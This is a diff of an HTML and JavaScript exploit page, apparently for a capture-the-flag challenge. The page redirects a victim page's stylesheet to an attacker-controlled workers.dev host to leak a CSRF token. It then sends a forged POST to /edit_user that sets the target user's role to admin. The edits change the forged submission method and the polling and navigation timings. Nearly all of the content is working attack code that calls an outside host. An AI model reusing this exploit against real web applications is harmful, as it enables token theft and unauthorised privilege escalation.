@@ -12,9 +12,7 @@
 const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
 const TARGET_ORIGIN = "http://localhost:5000";
 const TARGET_USER_ID = "702762c6-8766-4ce8-8146-065cc4535363";
-
-// 每次重新 report 都換新的 id
-const id = "run005";
+const id = "run006";
 
 const logEl = document.getElementById("log");
 function log(...xs) {
@@ -25,7 +23,6 @@ function log(...xs) {
 
 const workerHost = new URL(WORKER_BASE).host;
 
-// 讓 /edit_user 頁面的 stylesheet 轉去你的 worker
 const innerTheme =
   `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;
 
@@ -57,6 +54,7 @@ async function getState() {
   return await r.json();
 }
 
+// 先保留最簡單版；等 done=true 再換成 run004 的 javascript: 提交
 function sendFinal(token) {
   if (finished) return;
   finished = true;
@@ -64,26 +62,22 @@ function sendFinal(token) {
   clearInterval(pollTimer);
 
   log("[+] token =", token);
-  log("[+] sending final POST via victim window");
+  log("[+] sending final POST");
 
-  const js = `javascript:(() => {
-    try {
-      const f = document.createElement('form');
-      f.method = 'POST';
-      f.action = '/edit_user';
-      f.innerHTML = \`
-        <input name="user_id" value="${TARGET_USER_ID}">
-        <input name="username" value="">
-        <input name="password" value="">
-        <input name="role" value="admin">
-        <input name="csrf_token" value="${token}">
-      \`;
-      document.body.appendChild(f);
-      f.submit();
-    } catch (e) {}
-  })()`;
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = `${TARGET_ORIGIN}/edit_user`;
+  form.target = "victim";
+  form.innerHTML = `
+    <input name="user_id" value="${TARGET_USER_ID}">
+    <input name="username" value="">
+    <input name="password" value="">
+    <input name="role" value="admin">
+    <input name="csrf_token" value="${token}">
+  `;
+  document.body.appendChild(form);
+  form.submit();
 
-  victimWin.location = js;
   log("[+] submitted");
 }
 
@@ -103,13 +97,11 @@ async function poll() {
 log("[*] id =", id);
 log("[*] victimUrl =", victimUrl);
 
-// 先打一次
 navVictim();
 poll();
 
-// 這組節奏先用這個
-navTimer = setInterval(navVictim, 180);
-pollTimer = setInterval(poll, 80);
+navTimer = setInterval(navVictim, 260);
+pollTimer = setInterval(poll, 70);
 </script>
 </body>
 </html>
